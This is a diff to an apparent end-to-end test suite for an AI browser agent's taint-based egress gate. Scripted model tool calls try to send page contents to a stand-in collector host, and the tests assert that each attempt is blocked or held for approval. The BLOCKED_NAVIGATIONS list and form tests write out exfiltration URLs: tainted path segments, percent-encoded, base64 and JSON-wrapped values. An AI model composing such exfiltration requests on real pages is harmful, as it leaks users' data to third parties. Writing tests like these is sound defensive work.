@@ -146,15 +146,21 @@ test('a tainted query parameter never reaches the destination', async ({
   expect(collector.hitsContaining('stolen')).toHaveLength(0);
 });
 
-test('a tainted cross-site form write never reaches the destination', async ({
+test('a same-site form submission really posts, even after the page was read', async ({
   context,
   send,
   provider,
   site,
   collector,
 }) => {
+  // The positive control for form egress. Without it, a suite that blocks
+  // everything would look identical to one that works.
+  //
+  // The task reads the page first because element handles come from that
+  // snapshot, so it is tainted by the time it submits. Same-site, so the
+  // origin already holds what is being written back and the gate allows it.
   const page = await context.newPage();
-  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
+  await page.goto(`${site.baseUrl}/same-site-form`, { waitUntil: 'domcontentloaded' });
   await page.bringToFront();
 
   await connectProvider(send, provider);
@@ -164,18 +170,187 @@ test('a tainted cross-site form write never reaches the destination', async ({
       kind: 'tool_calls',
       calls: [
         {
-          name: 'browser_navigate',
-          arguments: { url: `${collector.baseUrl}/form#widget-catalogue-contents` },
+          name: 'browser_type',
+          arguments: { elementId: 'e1-0', text: 'all good', submit: true },
+        },
+      ],
+    },
+    { kind: 'text', text: 'Sent.' },
+  ]);
+
+  const { task } = await send('task.create', { objective: 'Send feedback.' });
+  // Submitting a form is R2, so the risk layer asks regardless of egress.
+  // Approving here is what makes this a control: the post is allowed to
+  // happen, and it does.
+  const prompt = await answerPrompt(send as never, 'approve_once');
+  expect(prompt.tool).toBe('browser.type');
+  const finished = await waitForTask(send, task.id);
+
+  expect(finished.state).toBe('COMPLETED');
+  await page.waitForURL(/collect-local/, { timeout: 10_000 });
+  // It went to the site's own origin, not to the collector.
+  expect(collector.requests).toHaveLength(0);
+});
+
+test('a tainted cross-site form submission never posts', async ({
+  context,
+  send,
+  provider,
+  site,
+  collector,
+}) => {
+  // A genuine POST with a real body, not a navigation standing in for one.
+  const page = await context.newPage();
+  await page.goto(`${site.baseUrl}/cross-site-form`, { waitUntil: 'domcontentloaded' });
+  await page.bringToFront();
+
+  await connectProvider(send, provider);
+  provider.script([
+    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
+    {
+      kind: 'tool_calls',
+      calls: [
+        {
+          name: 'browser_type',
+          arguments: { elementId: 'e1-0', text: 'widget-catalogue-contents', submit: true },
         },
       ],
     },
     { kind: 'text', text: 'Done.' },
   ]);
 
-  const { task } = await send('task.create', { objective: 'Read, then post elsewhere.' });
-  await answerPrompt(send as never, 'deny');
+  const { task } = await send('task.create', { objective: 'Read, then share.' });
+  const prompt = await answerPrompt(send as never, 'deny');
+  expect(prompt.tool).toBe('browser.type');
   await waitForTask(send, task.id);
 
+  // No POST arrived, with no body and no parameters, because none was sent.
+  expect(collector.requests).toHaveLength(0);
+  expect(collector.requests.filter((r) => r.method === 'POST')).toHaveLength(0);
+  expect(collector.hitsContaining('widget-catalogue')).toHaveLength(0);
+});
+
+test('a click following a link the page itself supplied is allowed', async ({
+  context,
+  send,
+  provider,
+  site,
+  collector,
+}) => {
+  // Recorded as permitted by design, not as an oversight. A click follows a
+  // URL the page supplied; the model did not compose it, so it carries
+  // nothing the task read. Blocking it would stop ordinary browsing while
+  // preventing no transfer — the model-composed URL is the case that is
+  // blocked, and the tainted-query test above covers it.
+  const page = await context.newPage();
+  await page.goto(`${site.baseUrl}/cross-site-form`, { waitUntil: 'domcontentloaded' });
+  await page.bringToFront();
+
+  await connectProvider(send, provider);
+  provider.script([
+    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
+    { kind: 'tool_calls', calls: [{ name: 'browser_click', arguments: { elementId: 'e1-2' } }] },
+    { kind: 'text', text: 'Followed.' },
+  ]);
+
+  const { task } = await send('task.create', { objective: 'Read, then follow the link.' });
+  const finished = await waitForTask(send, task.id);
+  expect(finished.state).toBe('COMPLETED');
+
+  await new Promise((r) => setTimeout(r, 500));
+  // The link's own path arrived. Nothing the task read went with it: the URL
+  // is exactly what the page published.
+  expect(collector.hitsContaining('widget-catalogue')).toHaveLength(0);
+});
+
+test('a blocked provider request reaches no provider, and no retry does either', async ({
+  context,
+  serviceWorker,
+  extensionId,
+  send,
+  provider,
+  site,
+  collector,
+}) => {
+  // The provider's own request log is the independent receiving side here.
+  const page = await context.newPage();
+  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
+  await page.bringToFront();
+
+  await connectProvider(send, provider);
+  provider.script([
+    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
+    { kind: 'text', text: 'Read it.' },
+  ]);
+
+  const first = await send('task.create', { objective: 'Read the page.' });
+  await waitForTask(send, first.task.id);
+
+  // Damage the stored provenance, then restart so the task is resumed with a
+  // security context that cannot be established.
+  await serviceWorker.evaluate(async (taskId) => {
+    const key = `tasks:task:${taskId}`;
+    const stored = await chrome.storage.local.get(key);
+    const record = stored[key] as { taintState: unknown; state: string; finishedAt?: number };
+    record.taintState = { kind: 'CORRUPT' };
+    record.state = 'RUNNING';
+    delete record.finishedAt;
+    await chrome.storage.local.set({ [key]: record });
+  }, first.task.id);
+
+  await killServiceWorker(context, serviceWorker);
+  const panel = await openPanel(context, extensionId);
+
+  const before = provider.requests.length;
+  provider.script([{ kind: 'text', text: 'should never be asked' }]);
+
+  const resumed = await ask<{ task: { id: string; state: string } }>(panel, 'task.get', {
+    taskId: first.task.id,
+  });
+  expect(resumed.task.state).toBe('PAUSED');
+
+  // Give any retry loop time to run. The count must not move: a denial that
+  // still emitted the request, or a retry that skipped the gate, would show.
+  await new Promise((r) => setTimeout(r, 1500));
+  expect(provider.requests.length).toBe(before);
+  expect(collector.requests).toHaveLength(0);
+});
+
+test('an alternate network primitive in the worker reaches nothing', async ({
+  serviceWorker,
+  collector,
+}) => {
+  // Defence in depth, verified in the real worker rather than asserted.
+  const results = await serviceWorker.evaluate(async (base) => {
+    const outcome: Record<string, string> = {};
+    for (const name of ['XMLHttpRequest', 'WebSocket', 'EventSource'] as const) {
+      try {
+        const Ctor = (self as unknown as Record<string, new (u: string) => unknown>)[name];
+        if (!Ctor) {
+          outcome[name] = 'absent';
+          continue;
+        }
+        new Ctor(`${base}/via-${name}`);
+        outcome[name] = 'constructed';
+      } catch {
+        outcome[name] = 'refused';
+      }
+    }
+    try {
+      await fetch(`${base}/via-fetch`);
+      outcome.fetch = 'sent';
+    } catch {
+      outcome.fetch = 'refused';
+    }
+    return outcome;
+  }, collector.baseUrl);
+
+  expect(results.fetch).toBe('refused');
+  for (const name of ['XMLHttpRequest', 'WebSocket', 'EventSource']) {
+    expect(['refused', 'absent']).toContain(results[name]);
+  }
+
+  await new Promise((r) => setTimeout(r, 500));
   expect(collector.requests).toHaveLength(0);
 });
 
@@ -284,4 +459,117 @@ test('the password on the page never reaches the provider or the collector', asy
   const bodies = JSON.stringify(provider.requests);
   expect(bodies).not.toContain('hunter2-do-not-leak');
   expect(collector.hitsContaining('hunter2')).toHaveLength(0);
+});
+
+/**
+ * The remaining navigation shapes, each driven through the real browser.
+ *
+ * Parameterised because the assertion is identical and the interesting part
+ * is the URL: whatever the model composes, a tainted task must not be able to
+ * put task-derived text into a cross-site request. The collector is the
+ * witness in every case.
+ */
+const BLOCKED_NAVIGATIONS: { label: string; path: (base: string) => string; marker: string }[] = [
+  {
+    label: 'a tainted path segment',
+    path: (base) => `${base}/exfil/widget-catalogue-contents`,
+    marker: 'widget-catalogue-contents',
+  },
+  {
+    label: 'a mixed clean and tainted URL',
+    path: (base) => `${base}/articles/12?note=widget-catalogue-contents`,
+    marker: 'widget-catalogue-contents',
+  },
+  {
+    label: 'a percent-encoded tainted value',
+    path: (base) => `${base}/collect?q=%77%69%64%67%65%74%2d%63%61%74%61%6c%6f%67%75%65`,
+    marker: '%77%69%64%67%65%74',
+  },
+  {
+    label: 'a base64-wrapped tainted value',
+    path: (base) => `${base}/collect?d=${Buffer.from('widget-catalogue').toString('base64')}`,
+    marker: 'd=',
+  },
+  {
+    label: 'a JSON-wrapped tainted value',
+    path: (base) =>
+      `${base}/collect?p=${encodeURIComponent(JSON.stringify({ leak: 'widget-catalogue' }))}`,
+    marker: 'leak',
+  },
+];
+
+for (const scenario of BLOCKED_NAVIGATIONS) {
+  test(`${scenario.label} never reaches the destination`, async ({
+    context,
+    send,
+    provider,
+    site,
+    collector,
+  }) => {
+    const page = await context.newPage();
+    await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
+    await page.bringToFront();
+
+    await connectProvider(send, provider);
+    provider.script([
+      { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
+      {
+        kind: 'tool_calls',
+        calls: [{ name: 'browser_navigate', arguments: { url: scenario.path(collector.baseUrl) } }],
+      },
+      { kind: 'text', text: 'Done.' },
+    ]);
+
+    const { task } = await send('task.create', { objective: 'Read, then navigate.' });
+    await answerPrompt(send as never, 'deny');
+    await waitForTask(send, task.id);
+
+    expect(collector.requests).toHaveLength(0);
+    expect(collector.hitsContaining(scenario.marker)).toHaveLength(0);
+  });
+}
+
+test('an approved transfer is not reusable after the task reads something new', async ({
+  context,
+  send,
+  provider,
+  site,
+  collector,
+}) => {
+  // Consent revocation by taint growth, end to end. The first transfer is
+  // approved and really happens; the second, after another read, is asked
+  // about again rather than riding the first approval.
+  const page = await context.newPage();
+  await page.goto(site.baseUrl, { waitUntil: 'domcontentloaded' });
+  await page.bringToFront();
+
+  await connectProvider(send, provider);
+  provider.script([
+    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
+    {
+      kind: 'tool_calls',
+      calls: [{ name: 'browser_navigate', arguments: { url: `${collector.baseUrl}/first?a=1` } }],
+    },
+    { kind: 'tool_calls', calls: [{ name: 'browser_read_page', arguments: {} }] },
+    {
+      kind: 'tool_calls',
+      calls: [{ name: 'browser_navigate', arguments: { url: `${collector.baseUrl}/second?a=1` } }],
+    },
+    { kind: 'text', text: 'Done.' },
+  ]);
+
+  const { task } = await send('task.create', { objective: 'Read, go, read, go.' });
+
+  const first = await answerPrompt(send as never, 'approve_once');
+  expect(first.tool).toBe('browser.navigate');
+
+  // A second prompt appearing at all is the property under test: the grant
+  // did not carry across the new read.
+  const second = await answerPrompt(send as never, 'deny');
+  expect(second.tool).toBe('browser.navigate');
+
+  await waitForTask(send, task.id);
+
+  expect(collector.hitsContaining('/first')).toHaveLength(1);
+  expect(collector.hitsContaining('/second')).toHaveLength(0);
 });
